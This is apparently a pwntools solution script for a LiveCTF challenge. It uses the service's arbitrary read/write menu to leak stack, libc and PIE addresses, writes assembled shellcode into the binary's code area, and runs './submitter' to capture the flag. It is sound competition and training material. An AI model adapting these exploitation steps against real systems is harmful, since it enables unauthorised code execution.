from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
io = remote(HOST, int(PORT))

io.sendlineafter(b'Choice: \n', b'1')

io.sendlineafter(b'Address: \n', b'1')

io.recvuntil(b'Value: ')
context.arch = "amd64"
stack = int(io.recv(12), 16)
print(hex(stack))
ret = stack - 0x110

def readv(addr):
    io.sendlineafter(b'Choice: \n', b'1')
    io.sendlineafter(b'Address: \n', hex(addr).encode())
def writev(addr, value):
    io.sendlineafter(b'Choice: \n', b'2')
    io.sendlineafter(b'Value: \n', hex(value).encode())
    io.sendlineafter(b'Address: \n', hex(addr).encode())

readv(ret)
io.recvuntil(b'Value: ')
libc = int(io.recv(12), 16) - 0x29d90
print(hex(libc))
l = stack - 0x120
readv(l)
io.recvuntil(b'Value: ')
pie = int(io.recv(12), 16) - 0x1484

readv_helper = pie+0x1488
writev_helper = pie+0x14fc

write_ = pie+0x1488+0x100
kk = write_
print(hex(write_))
pl = asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(pie+0x3590, libc+0x1d8678, writev_helper))

pl += asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(0x3510+pie, libc+0x50d70 , writev_helper))

pl += asm("""
    push 110
    pop rax
    syscall
    mov r10, rax
    mov rdi, rax
    mov rsi, {}
    mov rdx, {}
    mov rcx, {}
    call rcx
""".format(0x3500+pie,pie+0x000000000000134D , writev_helper))

for i in range((len(pl))//8 +1):
    writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b'\x90')))

write_ = pie+0x1488
pl = asm("""
    mov rcx, {}
    jmp rcx
""".format(kk))

for i in range((len(pl))//8 +1):
    writev(write_+i*8, u64(pl[i*8:(i+1)*8].ljust(8, b'\x90')))

writev(write_-8, u64(p64(0x9090909090909090)))
sleep(0.1)
io.sendline(b'3')

io.sendline(b'./submitter')
flag = io.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
